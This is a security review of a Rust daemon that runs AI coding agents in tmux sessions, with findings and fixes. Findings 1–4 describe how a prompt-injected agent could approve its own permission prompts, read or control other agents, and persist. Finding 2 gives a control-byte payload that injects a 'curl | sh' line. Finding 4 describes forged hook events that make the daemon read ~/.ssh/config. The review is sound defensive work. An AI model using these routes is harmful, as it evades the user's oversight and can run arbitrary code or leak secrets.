# Daemon review (security and robustness)

Scope: `crates/muster-proto`, `muster-core`, `musterd`, `muster-cli` as of 2026-11-14.
Method: I read the code. Finding 3 was checked with a small throwaway test (a private
`muster-test-*` tmux socket in a temp dir, removed afterwards); everything else comes from
reading the code. This was a
read-only review: no daemon file was changed.

Threat model: anything that holds the token or runs on the Mac as the user controls the
daemon, and the daemon is a remote shell. Agents run as the user, so an agent that can run
unrestricted shell commands is already as powerful as the user. Findings 1–4 still matter
for three reasons. First, they let an agent get around its own permission prompts.
Second, they turn a restricted agent (one with prompts, a sandbox or a read-only mode) into
one with full control over every card. Third, the CLI's "linked cards only" rule is
presented, in the docs and in the instructions given to agents, as an access rule.

## 1. HIGH: agents use the master token; the link rule is only asserted by the client

- `muster-cli/src/client.rs:46` reads `$MUSTER_HOME/token`. `musterd/src/server.rs:599`
  passes `MUSTER_HOME` (and `MUSTER_CLI`) into every card. `server.rs:210` has a single
  role: whoever holds the token can call every method.
- `context.rs:130-135` checks links only when the caller sends `fromCardId` itself, and
  `muster-cli/src/main.rs:235-243` leaves it out when `MUSTER_CARD_ID` is unset.

What a prompt-injected agent in card A can do:
- `env -u MUSTER_CARD_ID $MUSTER_CLI context read <B> --any --transcript 200` reads any card.
- `$MUSTER_CLI link $MUSTER_CARD_ID <B>` (a documented command) creates the link that
  makes B "readable".
- A ten-line WebSocket client with the token can:
  - call `approval.answer` for its own pending request, approving its own permission
    prompt;
  - call `term.write` into a `shell` card, or `card.create --agent shell --start`, to run
    any command;
  - call `project.update {worktreeSetup}` to store a script that runs for every later
    worktree card (persistence);
  - call `card.delete --killSession` or `session.kill` on any card.

Suggested fix:
- Issue each card its own random token (`MUSTER_CARD_TOKEN`, generated at `start_card` and
  kept only in memory or the database). `hello` with a card token gets a restricted role:
  - `context.list` / `context.read` only, with `fromCardId` forced to the token's card on
    the server;
  - notes and `card.move` only for that card;
  - `message.send` only from that card;
  - no `link.*`, `term.*`, `approval.*`, `project.*` or `card.create`.
- Make the CLI prefer `MUSTER_CARD_TOKEN`, and stop passing `MUSTER_HOME` to cards.
- Document that this restrains well-behaved agents and agents with limited tools. It
  cannot stop an agent that has unrestricted shell access, because that agent can read the
  token file. A real boundary needs the agent's own sandbox to deny `$MUSTER_HOME`.

## 2. HIGH (defence in depth): message delivery types raw control bytes into another agent

`context.rs:252-268` writes `"[Message from …] " + text` byte for byte into the target's
TTY. Bracketed paste is used only when the text contains `\n`. A `\r` submits right away,
an ESC interrupts Claude Code, and `\x1b[201~` ends the paste early.

Scenario: card A sends `ok\r!curl https://x | sh\r`. The first `\r` submits a harmless
prompt, and the rest is typed into the target agent's input. In Claude Code a line that
starts with `!` runs in bash mode with no permission prompt. I did not test this against
the real CLI (it would need a live agent), but nothing in the code prevents it. The card
title in the header (`context.rs:248`) is not sanitised either.

`send()` (`context.rs:195`) does not cap text length (only the 16 MB frame limit applies),
and there is no rate limit per sender.

Suggested fix:
- Drop C0/C1 controls and ESC; keep only `\n` and `\t`.
- Always use bracketed paste, after removing any `\x1b[20[01]~` from the text.
- Cap the text at `MAX_TEXT` and do the same to the title.
- Rate-limit messages per (from, to) pair.

## 3. MEDIUM: card processes can reach Muster's tmux server through `$TMUX`

tmux sets `TMUX` and `TMUX_PANE` for every pane, and plain `tmux` commands inside a card
then go to Muster's server. Verified: `tmux ls` run inside one session of a
`muster-test-*` server listed every session.

Scenario: an agent cleaning up after itself runs `tmux kill-server`, or the user starts
tmux inside a card, and every card is killed. An agent can also
`tmux send-keys -t m-<B> …` or `capture-pane` any other card, bypassing finding 1's fix.

Suggested fix:
- Start the child under `env -u TMUX -u TMUX_PANE` (in `tmux.rs:308-316` `shell_argv`).
- The setup wrapper needs a target, so pass it explicitly (`MUSTER_TMUX_TARGET='=m-<id>:'`)
  instead of `$TMUX_PANE`, and run its `tmux` call with `-L <socket>`.

## 4. MEDIUM: forged hook events for any card; daemon reads paths from hook payloads

- The hook socket is 0600 inside a 0700 home, so other local users are kept out. But
  every card process has `MUSTER_HOOK_SOCK`, and the envelope's `cardId` is free text.
- An agent in card A can therefore send events as card B:
  - fake running, done or needs-you states, notifications, or permission prompts that the
    user may "approve";
  - a fake `transcript_path` (for example `~/.ssh/config`). The daemon then reads that
    file for B's chat view, B's usage, and for `context.read --transcript`
    (`agents.rs:521-530`, `833-840`, `1036-1080`).

Suggested fix:
- Give each card a hook secret in its environment (`MUSTER_HOOK_TOKEN`). muster-hook
  copies it into the envelope; the receiver or daemon drops events whose secret does not
  match the card. I can add that to muster-agents and muster-hook.
- Accept `transcript_path` only under the adapter's own transcript root (Claude:
  `<config>/projects/`).

## 5. MEDIUM: blocking work on the single-threaded runtime

The daemon runs `new_current_thread` (`main.rs:146`). Several things run synchronously on
that one thread:
- transcript scans of up to 32 MB per call, inside `Agents::handle` while holding the
  `cards` mutex (`agents.rs:833`);
- `chat_page`, and `context.read` for transcripts and screens;
- every SQLite call (`store.lock().unwrap()` in handlers);
- `std::fs` writes (scrollback, setup files).

Scenario: with a large transcript (100+ MB happens) or a slow disk, every WebSocket stalls,
including terminal output and pings. Clients may then be dropped as "too slow".

Suggested fix: use `spawn_blocking` (or a dedicated worker thread) for transcript and
scrollback I/O and anything that calls an adapter's file readers. Alternatively, switch to
a multi-thread runtime and keep holding std mutexes only for short stretches.

## 6. LOW–MEDIUM: SIGTERM by pid after the child may have been reaped

`attach.rs:97-103` kills the terminal client by stored pid (`kill_pid`, called at `137`,
`216`, `223`, `263`, `304`). The child is reaped in a separate task (`176-179`). If the
client has already exited and been reaped, its pid may have been reused, and an unrelated
process of the user gets SIGTERM.

Suggested fix: keep the `Child` (or a cancellation channel) inside `Attachment` and kill
through it, or check whether it has already exited before signalling.

## 7. LOW: growth without bounds and size limits

- `musterd.log` (launchd `StandardErrorPath`, `launchd.rs:64-67`) is never rotated.
- The `activity` table is never pruned.
- Deleted cards leave `setup/<id>*.sh` and `exit/` files behind (`server.rs:397-419`
  removes only the scrollback).
- `send_input` passes one tmux argument per byte (`tmux.rs:382-390`). A large
  `term.write` or message with no attached client fails with E2BIG (my estimate is around
  250 KB). Send it in chunks, or use `load-buffer` + `paste-buffer`.

## 8. LOW: pane output can set the viewer's clipboard

`set -g set-clipboard on` (`tmux.rs:140`) forwards OSC 52 from any program in a card to the
attached client. Agent output, or a file it `cat`s, can then replace the clipboard with a
command the user pastes later. Use `external` or `off` unless copying out of the app needs
it, and have the app's terminal ask before applying OSC 52.

## 9. LOW: origin and network checks are thin; the token is the only real gate

- `origin_allowed` (`server.rs:70-81`) accepts any `http://localhost:<port>` page, so any
  local web app or dev server can open the socket (it still needs the token).
- `peer.ip().is_loopback()` (`server.rs:37`) means nothing once `tailscale serve` proxies
  the port, because all tailnet traffic then arrives from loopback.
- There is no rate limit or lockout on bad `hello` attempts. That is fine with a 256-bit
  token, but needed before phase 8, together with per-device tokens.

## 10. LOW: daemon exits when tmux is missing

`TmuxBackend::new` fails, so `run()` returns an error (`main.rs:140`). launchd
(`KeepAlive{SuccessfulExit:false}`) then restarts it about every 10 s forever and the app
cannot connect. Better: stay up, report `unavailable` with a notice in `daemon.status`, and
refuse session methods.

## 11. Mismatches with docs/PROTOCOL.md

- `daemon.status` exists in code (`muster-proto`) but is not in the PROTOCOL.md method
  table.
- PROTOCOL.md ("Context": `context.read` with `fromCardId` "requires the two cards to be
  linked") reads as an access rule. It is only checked when the caller sends `fromCardId`
  (finding 1).

## Checked and fine

- Token: 32 bytes from `/dev/urandom`, file 0600, home 0700, compared in constant time.
  Any request before `hello` closes the socket.
- tmux targets always use exact match (`=m-<id>`); card ids are generated
  (`new_id`, `[a-z2-9]`) and always come back from the database, so file paths
  (scrollback, setup, exit) cannot be steered with `../`.
- `git` and `tmux` are always run with argv, never through a shell. Branch names are
  validated (no leading `-`, no `..`, no spaces or control characters), so worktree paths
  cannot escape the project's parent directory.
- Agent argv is shell-quoted once for the login shell (`'\''` also works in fish).
  Setup and restore wrappers quote every interpolated path.
- The restore wrapper replays `capture-pane -e` output, which keeps only colour and
  attribute codes, so no OSC sequences are replayed.
- WebSocket outbound queues are bounded (1024; a slow client is disconnected). The output
  activity channel is rate-limited to one event per card per second. Frames are capped at
  16 MB.
- Release builds use `panic = "abort"`, so a panic restarts the daemon through launchd
  rather than leaving poisoned mutexes behind. Sessions survive in tmux.
